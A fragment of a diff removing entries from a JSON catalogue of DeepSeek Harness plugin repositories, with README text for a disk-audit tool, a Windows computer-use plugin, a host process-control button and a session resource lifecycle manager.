harness 内使用（agent 可调用）\n\n对 agent 说：\n\n> 看看我的 dsh 数据目录占了多少磁盘，最大的文件是哪些。\n\n工具返回 `dsh-disk-audit/v1` 报告（结构见英文版 JSON 示例）。\n\n## 为什么需要它\n\n- 会话日志追加式增长，能悄悄吃掉几个 GB；没有其他插件按目录报告磁盘占用。\n- 在 500 MB 会话日志撞上 stringify 上限之前发现它，比事后恢复便宜得多。\n- 零运行时依赖、天然只读——永不删除或移动任何东西。\n\n## 开发\n\n```sh\npnpm install\npnpm typecheck\npnpm build\npnpm test\npnpm test:integration\n```\n\nCI 跑 dsh-plugin-doctor 预检、单元测试、打包集成（真实 `disk_audit` 调用）、Windows 全新 profile 的 `dsh web` 启动冒烟。\n\n## 许可证\n\nMIT © 2026 zoahdev\n## Related ecosystem tools\n\n- [dsh-dep-audit](https://github.com/zoahdev/dsh-dep-audit) - dependency supply-chain hygiene\n- [dsh-quality-score](https://github.com/zoahdev/dsh-quality-score) - plugin quality scorecard + full-registry leaderboard\n- [dsh-ecosystem](https://github.com/zoahdev/dsh-ecosystem) - health scan, impact, trend, live dashboard\n- [dsh-tutorials](https://github.com/zoahdev/dsh-tutorials) - bilingual plugin pipeline tutorials\n## FAQ\n\n- **How do I install?** dsh plugin add dsh-disk-audit or run the CLI directly (see README).\n- **Does it need an API key?** No.\n- **Is it read-only?** Yes by default; any write/apply is an explicit flag.\n## Examples\n\nSee the README for full CLI usage. Quick start:\n\n```sh\nnpx dsh-disk-audit --help\n```\n\n"
-    },
-    {
-      "full_name": "JeremyWangCY/dsh-pc-pilot",
-      "html_url": "https://github.com/JeremyWangCY/dsh-pc-pilot",
-      "description": "Windows computer-use runtime, CLI, and DeepSeek Harness host plugin: UIA accessibility targeting, occlusion-immune per-window capture, background synthetic input, and a persistent Chromium CDP session.",
-      "stars": 1,
-      "language": "PowerShell",
-      "pushed_at": "2026-09-16T02:29:28Z",
-      "topics": [
-        "accessibility",
-        "automation",
-        "cdp",
-        "cli",
-        "computer-use",
-        "deepseek-harness",
-        "desktop-automation",
-        "dsh",
-        "dsh-plugin",
-        "screenshot",
-        "uia",
-        "windows"
-      ],
-      "categories": [
-        "终端/TUI"
-      ],
-      "tags": [
-        "accessibility",
-        "automation",
-        "cdp",
-        "cli",
-        "computer-use",
-        "deepseek-harness",
-        "desktop-automation",
-        "dsh"
-      ],
-      "readme_text": "# dsh-pc-pilot\n\nEnglish | [中文](./README.zh.md)\n\n[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)\n![Platform: Windows](https://img.shields.io/badge/platform-Windows%2010%2F11-lightgrey)\n![Node](https://img.shields.io/badge/node-%E2%89%A522.12-green)\n[![npm](https://img.shields.io/npm/v/dsh-pc-pilot.svg)](https://www.npmjs.com/package/dsh-pc-pilot)\n[![CI](https://github.com/JeremyWangCY/dsh-pc-pilot/actions/workflows/ci.yml/badge.svg)](https://github.com/JeremyWangCY/dsh-pc-pilot/actions/workflows/ci.yml)\n\nA **[DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness) host plugin** that gives the model a single `computer` tool to observe and operate the local Windows desktop: an indexed UIA accessibility tree, per-window screenshots, background synthetic-cursor input that never steals focus, and — when a task truly requires it — real SendInput mouse/keyboard control.\n\nWhile acting, the model moves a small **on-screen cursor indicator** (a rounded arrow with a soft blue radial glow) to each target point, and a frosted-glass status pill at the top center of the screen shows that PC-Pilot is running (with a breathing green dot on the right). Both are click-through, never take focus, and auto-hide three seconds after the last action.\n\n## Runtime scope\n\n**PC-Pilot targets one interactive Windows session: the user keeps working normally while the AI prefers background-safe paths.** Browser CDP, UIA patterns, target-window messages, WGC and PrintWindow are used to avoid focus theft whenever the application supports them. Virtual machines, a second desktop, or a hidden alternate Windows session are not part of the architecture. If an application truly requires real foreground SendInput, PC-Pilot reports that its background path is unavailable rather than pretending independent user/AI input can be guaranteed.\n\nOptimization priority: **browser batched/local observation → UIA caching and capability routing → reusable WGC capture sessions → conditional batching.** Capture support and background-input support are evaluated separately: being able to capture a covered window does not imply that the same application can accept safe background input. Application-specific object models, automation APIs, and domain integrations belong in separate plugins rather than PC-Pilot core.\n\n## Features\n\n- **One tool, full desktop plus browser** — the desktop surface uses canonical Windows Computer Use names directly: `list_apps`, `list_windows`, `get_window`, `launch_app`, `get_window_state`, `click`, `press_key`, `type_text`, `scroll`, `drag`, `set_value`, `perform_secondary_action`, `activate_window`, and `minimize_window`.\n- **Reusable Windows targets** — observations return `window: { id, app }`, which can be supplied unchanged to the next action. Element actions use `element_index`; screenshot coordinates use `scrollX` / `scrollY` and `mouse_button` where applicable.\n- **Background-first input with capability routing** — observations cache per-window/per-control support for UIA patterns (Invoke / Value / Toggle / Selection / ExpandCollapse / Scroll / RangeValue). Known-unsupported paths are skipped instead of reprobed on every action; verified target-window `WM_CHAR` / `WM_KEY` / `WM_MOUSEWHEEL` messages cover traditional controls without consulting an occluding foreground window. A fresh UIA observation rebuilds the capability map when the window/control tree changes.\n- **State-bound actions** — `get_window_state` returns a `snapshot_id` and `screenshot_id`; element actions must present that snapshot and coordinate actions can bind to the screenshot. Expired, moved, wrong-window, changed-element, or consumed state is rejected instead of falling back to a potentially wrong control.\n- **Persistent browser-use session** — one bounded CDP WebSocket is reused per isolated AI browser endpoint, with reusable per-tab sessions rather than reconnecting for every action. `browser_tabs`, `browser_history`, `browser_back` / `browser_forward`, and condition-based `browser_wait` provide session-level navigation; `browser_events` returns cursor-based console/network/lifecycle evidence and `browser_downloads` tracks Chromium download progress plus completed files. Screenshot observation has its own non-fatal timeout so a slow frame cannot tear down an otherwise healthy browser session. `browser_state` preserves raw tokens plus compact `@eN` refs for compatibility, while `browser_observe` returns the compact refs without UUID token noise; both remain bound to the exact tab/document/name/role. `browser_click`, `browser_type`, `browser_replace`, and `browser_key` accept either form. `launch_app { app: \"msedge.exe\", headless: true }` still starts a fresh isolated profile and `browser_*` never attaches to the user's own browser.\n- **Stable UIA identity + incremental state** — `include_text: true` assigns every returned control a stable `element_id`, plus monotonic `accessibility_revision` and `accessibility_delta` metadata (`added`, `removed`, `changed`, `unchanged_count`). Existing snapshot-bound `element_index` actions remain fully compatible; the stable identity is for reasoning across observations, not for bypassing stale-snapshot checks.\n- **Verified postconditions and deterministic recovery** — actions can carry an `expect` contract for window presence/closure, accessibility change, stable-element value, desktop text, browser URL/text/readiness, or completed downloads. A failed postcondition is reported as `postcondition_failed` and is never blindly replayed. `recovery: \"foreground_once\"` is intentionally narrow: it may retry only after an explicit `not_executed + background_unavailable`; element recovery requires the observed stable `element_id` so PC-Pilot can re-observe and remap a fresh index/snapshot first.\n- **Stable app identity and exact targeting** — `list_apps`, `list_windows`, and `get_window` expose an `app_identity` with Win32 executable identity or packaged-app AUMID, parent pid, and same-process-family root pid. Reuse `identity_key` to target a known app exactly instead of relying on title/process-name matching. `get_app_identity` lazily adds product/version/company metadata and optionally verifies Authenticode signer publisher/subject/thumbprint with executable-level caching.\n- **Bounded failure semantics** — one-shot helper calls have an external deadline watchdog. A timeout, disconnect, or post-dispatch transport error reports `outcome: \"unknown\"`; mutating actions are never replayed automatically.\n- **Lightweight conditional batching** — send up to 20 ordered actions through `actions`. Any step may use `when` as a precondition and `expect` as a verified postcondition; the next step runs only after the current gate is verified. `when` checks current state once by default (`timeout_ms: 0`) and never dispatches the action when unmet. There is deliberately no branching/workflow DSL or hidden replay engine; execution still stops at the first failed, unmet, or uncertain step.\n- **Structured safety classification** — obvious consequential target names and sensitive browser fields are classified in the result for future host policy integration; the current PC-Pilot profile does not interpose confirmation.\n- **Occlusion-immune background clicks** — with an `app` specified, coordinate clicks aim at the target window's own UIA tree / hwnd, so a fully covered window can be operated unattended while the user keeps working on top.\n- **Rich mouse vocabulary** — `click` supports standard `left`, `right`, `wheel` (middle), `back`, and `forward` buttons plus a bounded `click_count`; `scroll` preserves simultaneous `scrollX` / `scrollY` axes; `drag` uses `path`.\n- **Computer-use action spelling compatibility** — `double_click`, `type`, `keypress { keys: [...] }`, and `move` are accepted alongside the Windows canonical `click`, `type_text`, `press_key`, and `mouse_move` actions.\n- **O(1) element lookup** — `get_window_state` caches the UIA element list inside the persistent helper daemon, so `click { element_index }`, `set_value`, `perform_secondary_action`, `select_text`, and `type_text` resolve without a second full-tree traversal.\n- **"
-    },
-    {
-      "full_name": "baicaibucai1/dsh-process-control",
-      "html_url": "https://github.com/baicaibucai1/dsh-process-control",
-      "description": "DeepSeek Harness web plugin: one process-control button beside the sidebar Settings row. Restart the host, reload the page, or quit the host process.",
-      "stars": 1,
-      "language": "JavaScript",
-      "pushed_at": "2026-09-11T06:35:55Z",
-      "topics": [
-        "client-plugin",
-        "deepseek-harness",
-        "dsh",
-        "dsh-plugin",
-        "dshhub",
-        "process-control",
-        "restart",
-        "sidebar"
-      ],
-      "categories": [
-        "皮肤/UI"
-      ],
-      "tags": [
-        "client-plugin",
-        "deepseek-harness",
-        "dsh",
-        "dsh-plugin",
-        "dshhub",
-        "process-control",
-        "restart",
-        "sidebar"
-      ],
-      "readme_text": "# dsh-process-control\n\nA DeepSeek Harness **web plugin**: one process-control button beside the sidebar\nSettings row.\n\nSince DSH is normally started detached (`Start-Process … -WindowStyle Hidden`\nunder Windows, a background service under Linux), the host keeps running with no\nwindow and no obvious way to stop it. This plugin puts the three operations you\nactually need one click from the UI:\n\n| Menu item | What it does |\n| --- | --- |\n| **重启 DSH** | Relaunches the host from its exact boot invocation, detached, after the listening socket is released. The page reconnects once it is back. |\n| **刷新页面** | Reloads the current page. |\n| **结束进程** | Terminates the host process (SIGTERM, with a hard exit fallback). |\n\nThe menu header reports the live host facts: `pid`, serving port, whether the\nboot invocation could be determined, and the plugin version.\n\nRestart and quit ask for a second click before acting.\n\n## Install\n\n```sh\n# from npm — the channel the plugin market's discovery index reads\ndsh plugin --profile <profile> add dsh-process-control\n\n# straight from git\ndsh plugin --profile <profile> add git+https://github.com/baicaibucai1/dsh-process-control.git\n\n# or from a local checkout\ndsh plugin --profile <profile> add /path/to/dsh-process-control\n```\n\nThat command reconciles `dsh.profile.bundles` against the installed packages and,\nseeing this package's `dsh.bundle.patch`, appends `dsh-process-control` to the\nbundle stack — the profile boot then merges this package's `cordis.patch.yml`.\nNo profile file edits are needed.\n\n**No build step.** `lib/` is the shipped source: the host half is plain Node ESM\nand the browser half is the factory the shell's module table evaluates directly.\nA git install therefore needs no `pnpm install` and no bundler, and a checkout\nworks as-is.\n\n### Manual mount\n\nIf you would rather not use the CLI, install the package into the profile's\n`node_modules`, add it to `dsh.profile.bundles`, and — for a checkout that\ncarries no `dsh.bundle` field — add this row to the profile's own\n`cordis.patch.yml`:\n\n```yaml\n- insert:\n    - id: process-control\n      name: dsh-process-control\n```\n\n## Why the button lives in `shell.overlay`\n\nThe obvious seat is `sidebar.footer.action`, and it does not work. That slot is\nrendered by the shipped sidebar as a `display:flex; flex-direction:row` line\n`256px` wide with no wrap, and the entries already mounted there (a full-width\nbalance block, the Cordis panel) fill it. A further entry is laid out **past the\nsidebar's right edge** — measured on a 2002×1060 viewport: the next entry landed\nat `left=385` while the sidebar foot ends at `268` — so it sits outside the\ncolumn and is painted over by the main column. Registration succeeds and the\ncomponent renders; it is simply not on screen.\n\n`shell.overlay` is documented as the frame-wide floating layer *above every\ncolumn and outside their scroll containers*, and is click-through until an\nentry opts into pointer events. A fixed-position button there cannot be clipped\nor covered.\n\nThe anchor is **measured, not assumed**: the Settings row's rectangle is read\nfrom `[data-slot=\"sidebar.settings\"]` and re-read on a timer, so collapsing the\nsidebar, resizing the window, or a layout change moves the button with it. If\nthat row cannot be measured, the plugin renders nothing rather than guessing a\nposition.\n\n## How it works\n\n```\nlib/index.js   host half  (Node ESM, Cordis plugin: export { name, inject, apply })\nlib/client.js  browser half (module-table factory: exports.apply + exports.inject)\n```\n\nThe host half registers three exact routes on the browser HTTP carrier:\n\n```\nGET  /dsh-process-control/status    { pid, port, platform, node, canRestart, canQuit, openBrowser, urlFile, version }\nPOST /dsh-process-control/restart   { ok, pid, helperPid, logOut, logErr, urlFile }\nPOST /dsh-process-control/quit      { ok, pid }\n```\n\nEvery route accepts **only a direct same-origin loopback request**: the peer\naddress must be loopback, no `Forwarded` / `X-Forwarded-For` / `X-Real-IP` header\nmay be present, and `Origin` must be present and equal to `Host`. A page on\nanother origin, or a request that arrived through a proxy, cannot reach them.\n\nRestart is a detached handoff: a helper process started with `node -e` waits\nuntil the port actually stops accepting connections (checked by connecting —\nbinding to test would hold the very port the replacement needs), spawns the\nreplacement from the same `process.execPath` + `process.argv`, then confirms the\nport came back and writes a diagnosis beside the logs when it did not. On\nWindows the replacement is wrapped in `powershell -WindowStyle Hidden`, because\na bare `detached` spawn maps to `DETACHED_PROCESS` and every console child the\nnew host later spawns would pop a visible window. Logs land in the system temp\ndirectory as `dsh-process-control-<stamp>.out.log` / `.err.log`.\n\nThe browser half only renders and calls those routes with the page's own\nsame-origin `fetch`; it never touches the process.\n\n### What happens to the page you clicked from\n\n`dsh web` mints a fresh URL token on every boot, which looks like a trap: does a\nrestart strand the browser? It does not, because the **browser session cookie is\nsigned with a secret that is persisted** (a credential record), not with a\nper-boot value. A page that already authenticated therefore keeps working across\na restart on the SAME address: the stale `?token=…` in its URL is ignored once\nthe cookie checks out. In practice the page's connection layer reconnects on its\nown, and a manual reload of the same address works too.\n\nThe helper still writes the replacement's fresh `…/?token=…` line — scraped from\nthat process's own stdout — to `dsh-process-control-url.txt` in the system temp\ndirectory, for the case where a cookie is gone (a different browser, a cleared\nprofile). Opening a browser tab at that URL is opt-in; see below.\n\n## Configuration\n\nSet these on the plugin row, in the profile's own `cordis.patch.yml` — the layer\napplied after every bundle:\n\n```yaml\n- id: process-control\n  config:\n    openBrowser: false       # true also opens a tab at the fresh URL\n    hideCordisPanel: true    # false keeps the shipped Cordis panel entry\n```\n\n| Key | Default | Effect |\n| --- | --- | --- |\n| `openBrowser` | `false` | After a successful restart, open the default browser at the replacement's fresh `…/?token=…` URL — the same thing the launcher script does on a cold start. Off by default because the persistent session cookie already lets the same address come back. |\n| `hideCordisPanel` | `true` | Replace the shipped `cordis-panel` entry in the sidebar foot with an empty cell, so that row stops rendering. See below. |\n\n### Why it touches the shipped Cordis panel entry\n\n`hideCordisPanel` takes over the **cell** that the shipped\n`@deepseek-ai/dsh-client-ui-cordis` package registers into (`sidebar.footer.action`,\nid `cordis-panel`) by registering the same id with a winning priority (`-1`) and\nrendering nothing. The slot contract documents exactly this: \"reusing a shipped\nid puts you in THAT cell and replaces it\", and a cell renders the first live entry\nin priority order.\n\nOnly that one entry is suppressed. The `cordis_*` tool cards in the conversation,\nthe Cordis panel itself, and the ability to approve and run dynamic plugins are\nall untouched — which is why this is preferred over disabling the whole\n`ui-cordis` row. Set `hideCordisPanel: false` to keep the entry.\n\n## Development\n\n```sh\nnpm test          # node test/preflight.mjs\n```\n\n25 checks, no dependencies. The route guards (same-origin loopback only; and\n`/restart` + `/quit` refuse `GET` without side effects), the browser bundle\ncontract (registers under the package id, injects its own style tag, mounts the\noverlay button, and takes the Cordis cell), and the detached helper's source —\nwhich is *compiled* as JavaScript and checked for Windows quoting, because a typo\nin it would only surface at the moment someone clicks restart. CI runs all of it\non Linux, Windows and macOS against Node 20 and 22\n(`.github/workflows/ci.yml`).\n\n## For agents\n\nIf you are an agent looking for a DSH plugin that controls the host process:\n\n- **Package**: `dsh-proc"
-    },
-    {
-      "full_name": "G57651/dsh-session-manager",
-      "html_url": "https://github.com/G57651/dsh-session-manager",
-      "description": "DeepSeek Harness 会话管理面板插件：全部/已归档/已删除视图、批量管理、软删除回收站",
-      "stars": 1,
-      "language": "JavaScript",
-      "pushed_at": "2026-10-09T14:27:28Z",
-      "topics": [
-        "dsh-plugin"
-      ],
-      "categories": [
-        "工具/开发"
-      ],
-      "tags": [
-        "dsh-plugin"
-      ],
-      "readme_text": "# dsh-session-manager\n\n> **会话资源生命周期管理器（Session Resource Lifecycle Manager）—— DeepSeek Harness 插件。**\n>\n> 不再是「管理 Session 这一行」的侧边栏面板。0.2.0 起本插件完成架构升级，0.4.x 进一步补齐资源视图、删除回收链路与归档/删除后的页面稳定性：**Session 创建了什么、修改了什么、删除了什么、安装了什么、配置了什么，全程记录；Session 删除时，按变更记录反向清理这些变化——最后才删除变更记录本身。**\n\n一句话：**Session 对世界做了什么，本插件就管到它做完什么为止。**\n\n旧版本的 RPC 契约、调用方与 Web 客户端**完全兼容，可直接升级**。旧会话自动识别为 legacy，行为可整体回退（见「配置」）。\n\n---\n\n## 一、它解决什么问题\n\n一个 Session 跑完，留下的不只是对话记录，还有：\n\n- 新建的文件 / 目录\n- 改过的配置（`package.json` / `.env` / `tsconfig.json` …）\n- 装上的依赖（`node_modules/axios` …）\n- 删掉的基线文件\n- 起的后台进程（`nohup … &`）\n- 设置过的环境变量\n\nDeepSeek Harness 原生只管「Session 这一行」的归档 / 删除 / 恢复。本插件把**会话对工作区的副作用**纳入生命周期管理：全程留痕、删除反向清理、冲突可见、可恢复。\n\n## 二、生命周期模型\n\n```\nSession\n├── Baseline          插件首次看到会话时的有界工作区快照（文件哈希 + 内容 + 依赖快照）\n├── Resources         会话涉及的资源，统一抽象，Tracker 可扩展\n├── Change Journal    按会话隔离的 append-only 变更日志（JSONL）\n└── Cleanup State     清理状态机，先于动作落盘（cleanup.json），崩溃可续\n```\n\n**跟踪链路**（事件 + diff 混合式，不依赖单一文件监视器）：\n\n```\nSession Context\n    ↓\nCommand / Process Context      tool/call 事件：解析 export/unset、后台进程、下载意图（含 URL 归因）\n    ↓\nResource Tracking              tool/result 触发防抖工作区 diff + 可选周期扫描\n    ↓\nChange Journal                 逐条 append-only 落盘 + 删除前最终 diff（仅对空闲窗口内仍活跃的会话）\n```\n\n### 资源与动作\n\n不同资源类型只实现适用的动作：\n\n| 资源类型 | 记录的动作 | 删除 Session 时的回滚语义 |\n|---|---|---|\n| `file` | created / modified / deleted / moved / renamed / permission_changed | 会话新建 → 移除；修改 → 恢复基线内容；删除 → 从快照恢复 |\n| `directory` | created | 会话新建 → 空目录移除（非空保守跳过） |\n| `configuration` | 修改（package.json、.env、tsconfig 等知名配置） | 按基线快照恢复 |\n| `download` | downloaded（记录源 URL / 目标 / 时间 / 大小 / 哈希） | 同 file：新建则删，覆盖了原有文件则按基线恢复 |\n| `dependency` | installed / uninstalled / upgraded（Adapter/Strategy，内置 `node_modules` 适配器） | 会话新装 → 卸载；已有依赖 → **绝不动**（升级/卸过仅报告） |\n| `environment_variable` | set / unset（含 before / after / scope） | **仅审计**：值一律只存存在性 + 指纹；宿主 env 从不被写入，清理也不写（报告 `host-env-untouched`） |\n| `process` | spawned（nohup / 后台 `&`） | 记录在案；存活进程由宿主停活动机制处理 |\n\n### 归属权（Ownership）\n\n判断一个资源到底是不是当前 Session 产生的，**记录时刻对照 Baseline 判定并冻结**：\n\n| 归属 | 场景 | 删除 Session 时 |\n|---|---|---|\n| `session_created` | 基线里没有，会话建了它 | 直接移除 |\n| `session_modified` | 基线里就有，会话改了它 | 恢复修改前状态，**而不是删除文件** |\n| `session_deleted` | 基线里就有，会话删了它 | 按 before 快照恢复 |\n| `session_installed` | 会话装的新依赖 | 卸载 |\n| `session_configured` | 会话改了知名配置文件 | 按快照恢复 |\n| `preexisting` | 基线即有的资源 | **永不因会话删除而被移除** |\n\n## 三、Cleanup / Rollback Engine\n\n删除 / 彻底删除时的执行顺序（每步先做状态校验，全部幂等可重入）：\n\n```\nactive → delete_requested → rolling_back → rollback_verified / rollback_failed\n                                   ↓\n                             session_deleted → complete\n```\n\n1. **最终 diff**：删除前补记空闲窗口内仍活跃会话的尾部变更（疑似外部修改的，保守保留不回滚）。\n2. **依赖阶段**：卸载会话新装依赖；已有依赖绝不动；升级仅报告（无离线重装）。\n3. **路径阶段**：新建 → 移除；修改/删除 → 按基线快照恢复；**用户主动删除的资源不复活**（见下）。\n4. **环境阶段**：只读，仅报告（`host-env-untouched`）。\n5. **进程阶段**：报告存活进程。\n6. **验证阶段**：重新 diff 工作区，确认所有期望状态达成；未达成记 conflict/failure。\n\n**冲突检测**：每条记录的 `expectedAfter` 与磁盘当前哈希比对；不一致即 `conflict`，safe 模式跳过并报告，force 模式覆盖并标记 `executed: true`。\n\n**崩溃恢复**：状态机每步先落盘 `cleanup.json`；进程被 `kill -9`、重启后自动续跑未完成阶段，最终销毁日志。\n\n## 四、资源视图与删除回收链路（0.4.x）\n\n会话资源弹窗按类型分组展示全部会话产物，每行带归属权 / 状态胶囊，并提供：\n\n- **打开**：仅本机文件管理器（Finder / Explorer / Linux 文件管理器），无应用选择器。\n- **批量选择**：全选 / 反选 / 删除所选。**0.5.0 起「打开所选」按钮已删除**，槽位换成「回收站（N）」入口；单行「打开」与「打开工作区」保留。\n- **单行删除 / 批量删除**：删除 = **双写**——先复制内容 + 元数据进**插件内回收站**，再移入**系统废纸篓**。绝不破坏原文件。\n- **删除进度条（0.4.4）**：批量删除在**弹窗内**（工具条与资源列表之间）逐文件推进度条 `正在删除 3/12`，`role=progressbar` + `aria-valuenow`，宽度按已完成比例填充；单行删除走同一条链路（total=1）。计数按「文件」而不是字节：宿主 `deleteResources` 一次只搬一个路径，也没有字节总量可换算。\n- **删除结果提示窗（0.4.4）**：无论成功还是失败，批量删除结束后都在弹窗**之上**再叠一层结果对话框（宿主 `Modal`，portal 到 body，`useModalLayer` 管理层栈，Esc 只关最上层）：标题按结局分「删除完成 / 部分删除失败 / 删除失败」，副标题给出 `共 N 项：成功 X 项，失败 Y 项`，失败逐条列出**路径 + 原因**（最多 8 条，其余折叠为「以及另外 N 个失败项」），必须点「关闭」确认。0.4.2 及以前的提示写在**会话管理页面**上，而弹窗会盖住页面，所以删除过程中用户什么都看不到。\n- **失败保持所选（0.4.4）**：结果窗关闭后，失败行仍是选中态，再点一次「删除所选」= 精确重试失败项。\n- **回收站（0.5.0）**：不再是资源列表最底部的尾随区块（跟踪条目一多就要滚到最底），改为工具条「回收站（N）」弹出的独立对话框：标题带条数，每条一行原路径 +「恢复」，目录条目注明「目录」，空回收站给出说明。**恢复的成功 / 失败提示写在回收站弹窗内**——旧的页面通知被弹窗盖住，恢复失败看起来像没反应。\n\n### 用户主动删除的资源\n\n用户从资源弹窗删除一个文件时，插件：\n\n1. 写一条带 `metadata.trashed` 的 `deleted` 日志记录，并从内存跟踪状态 `forget` 该路径（防下次 diff 重复记录）。\n2. 资源视图将该行标记为 `status: trashed`（**仅当文件确实不在磁盘上**——恢复后自动翻回 present，无需等 diff）。\n3. 会话清理时**跳过**这类路径（`reason: user-trashed`）：用户主动删的不复活，可从回收站恢复。\n\n### 从回收站恢复\n\n恢复 = 从插件内回收站把内容写回原位 + 校验 SHA-256 + 清掉系统废纸篓里的已知副本。目标已存在 → 拒绝（绝不覆盖）。entryId 走格式与包含性双重校验，拒绝任何路径穿越。\n\n## 五、归档/删除后的页面稳定性（0.4.2）\n\n归档或删除**活跃**会话时，宿主会 `startSession` 新建会话并把中央面板切到对话页。本插件在 `archive` / `deleteSoft` / `purge` 操作期间开 2 秒抑制窗口：`panelInfo` 订阅若发现活动面板被宿主切走且仍在窗口内，就 `selectPanel(PANEL_ID)` 选回本面板。**用户手动切走（窗口外）不干预。**\n\n## 六、RPC API\n\n通道 `/dsh-session-manager`。所有端点返回严格 `{ ok: boolean, ... }`。\n\n| 端点 | 入参 | 作用 |\n|---|---|---|\n| `list` | `{ view: 'all' \\| 'archived' \\| 'deleted' }` | 会话列表，合并宿主 corpus 与 manifest，标题缓存折叠 |\n| `archive` / `unarchive` | `{ ids: string[] }` | 归档 / 取消归档，含 `stopActivity` |\n| `delete` / `restore` | `{ ids: string[] }` | 软删除（进 manifest）/ 恢复 |\n| `purge` | `{ ids: string[] }` | 彻底删除（清 manifest 墓碑） |\n| `track` | `{ ids: string[] }` | 显式触发一次 baseline/diff |\n| `changes` | `{ id, limit? }` | 变更日志（最近 N 条） |\n| `resources` | `{ id }` | 资源视图（行 + status + 归属 + 基线） |\n| `cleanupStatus` | `{ ids: string[] }` | 清理状态机当前态 |\n| `cleanup` | `{ ids: string[], mode: 'rollback-only' \\| 'full' \\| 'resume' }` | 触发清理 |\n| `deleteResources` | `{ id, paths: string[] }` | 用户删除文件（双写回收站 + 废纸篓） |\n| `recycleList` | `{ id? }` | 回收站条目（按会话过滤） |\n| `recycleRestore` | `{ entryId }` | 回收站还原到原位 |\n| `openResource` | `{ id, path }` | 在 OS 文件管理器中显示 |\n| `config` | `{}` | 当前配置快照 |\n\n## 七、配置\n\n全部 `volatile()`——改完即时生效，不重载插件。\n\n| 配置 | 默认 | 说明 |\n|---|---|---|\n| `confirmPurge` | `true` | 彻底删除前二次确认 |\n| `autoRefresh` | `true` | 会话事件驱动自动刷新列表 |\n| `maxBatchSize` | `200` | 单批最大操作会话数 |\n| `titleFetchLimit` | `300` | 标题批量拉取上限 |\n| `trackingEnabled` | `true` | 资源跟踪总开关 |\n| `autoCleanup` | `true` | 删除会话时自动跑清理 |\n| `autoResume` | `true` | 启动时自动续跑未完成清理 |\n| `trackingPollMs` | `0` | 周期扫描间隔；`0` = 纯事件驱动 |\n| `trackingIdleWindowMs` | `300000` | 会话安静多久后最终 diff 视为「疑似外部修改」 |\n| `trackingMaxFiles` | `5000` | 单次 diff 哈希预算上限（全树仍会走完，只限哈希） |\n| `trackingMaxDepth` | `12` | 扫描深度上限 |\n| `trackingMaxSnapshotBytes` | `8388608` | 单文件快照大小上限 |\n| `trackingExclude` | `[]` | 额外排除路径（追加到默认排除集，不替换） |\n| `conflictMode` | `'safe'` | 冲突处理：`safe` 跳过报告 / `force` 覆盖标记 |\n\n## 八、数据布局\n\n```\n$DSH_HOME/dsh-session-manager/\n├── tracking/<encoded-session-id>/\n│   ├── baseline.json        有界快照（cwd / files{path→{sha256,size,mode}} / dirs / dependencies / capturedAt）\n│   ├── changes.jsonl        append-only 变更日志\n│   ├── cleanup.json         清理状态机\n│   └── snapshots/           内容寻址 blob（SHA-256）\n├── recycle/\n│   ├── index.json           回收站条目索引（会话 / 原路径 / 类型 / 指纹 / 时间）\n│   └── <entryId>/\n│       ├── meta.json        单条元数据（workspaceCwd / trashPath）\n│       └── payload/…        原文件 / 原目录树\n└── dsh-session-manager-titles.json    标题缓存\n\n$DSH_HOME/dsh-session-manager-deleted.json    软删除 manifest（墓碑）\n```\n\n## 九、安全姿态\n\n- **路径包含性**：所有资源路径 `resolve(cwd, rel)` 后做 `isInsideRoot`（词法包含性判定：`rel` 逃出 cwd 即拒）。删除走 `rename`、复制走 `cp`（默认不解引用），因此工作区内的符号链接只会移动/复制链接本身，不会顺着它操作链接目标。\n- **entryId 校验**：`/^bin_[a-z0-9]+_[a-z0-9]+$/` + 包含性双重校验，拒绝穿越；索引里的 `originalPath` 在恢复时**再次**做包含性校验（索引是磁盘上的不可信输入）。\n- **原子性**：恢复用排他创建（`writeFile flag:'wx'` / `cp force:false`）保证「不覆盖」不可被 TOCTOU 绕过；索引读-改-写串行化，删除失败会回滚自己的回收站副本（不留幽灵条目）。\n- **快照哈希**：仅接受 `/^[0-9a-f]{64}$/`，杜绝通过日志哈希逃逸。\n- **进程派生**：opener 走 `execFile` + ARGV 数组，**永不**拼 shell 字符串。\n- **环境变量**：全部值脱敏（仅存存在性 + 指纹），宿主 env 从不被写入。\n- **凭据脱敏**：命令/URL 落盘前抹掉任意方案的 userinfo 与敏感参数（含 `X-Amz-Signature` 一类带厂商前缀的签名参数）。\n- **恢复不覆盖**：目标已存在 → 拒绝，绝不覆盖用户当前数据。\n- **保守失败**：清理遇非空目录、快照缺失、冲突 → 跳过并报告，不暴力删除。\n\n## 十、安装\n\n```bash\n# 方式一：DeepSeek Harness 插件市场（推荐）\n# 方式二：本地开发链接\ncd ~/.dsh/profiles/desktop\npnpm add @g57651/dsh-session-manager\n# 或直接符号链接到仓库\nln -s /path/to/dsh-session-manager node_modules/@g57651/dsh-session-manager\n```\n\n要求：Node `^22.19 || >=24`，DeepSeek Harness `>=0.1.7-rc.0`。\n\n## 十一、开发与验证\n\n```bash\n# 客户端 bundle 重建（含 useStore 选择器静态校验）\nnode scripts/build-client.mjs\n\n# 离线全量回归（无外部依赖）\nnode scripts/smoke-host.mjs        # 66 项：RPC 契约 + manifest + 归档/删除/恢复\nnode scripts/smoke-lifecycle.mjs   # 356 项：十场景 + 资源视图 + 回收站 + 用户删除链路\nnode scripts/smoke-client.mjs      # 45 项：客户端链路——逐文件进度序列、成功/部分/全失败结"
-    },
-    {
-      "full_name": "2026heshao/dsh-skill-mcp-board",
-      "html_url": "https://github.com/2026heshao/dsh-skill-mcp-board",
-      "description": "All-in-one board for DeepSeek Harness: MCP manager + Skills + tool-usage tailor + direct markets (WorkBuddy connectors, SkillHub 190k+ skills) with one-click install · DSH 一体化看板：MCP/技能/工具账本/三大市场直连安装",
-      "stars": 1,
-      "language": "JavaScript",
-      "pushed_at": "2026-10-12T05:38:22Z",
-      "topics": [
-        "ai-agent",
-        "dashboard",
-        "deepseek",
-        "deepseek-harness",
-        "dsh",
-        "dsh-plugin",
-        "marketplace",
-        "mcp",
-        "mcp-market",
-        "model-context-protocol",
-        "one-click-install",
-        "plugin-manager",
-        "skill-manager",
-        "skill-market",
-        "skillhub",
-        "skills",
-        "tool-tailor",
-        "workbuddy"
-      ],
-      "categories": [
-        "终端/TUI"
-      ],
-      "tags": [
-        "ai-agent",
-        "dashboard",
-        "deepseek",
-        "deepseek-harness",
-        "dsh",
-        "dsh-plugin",
-        "marketplace",
-        "mcp"
-      ],
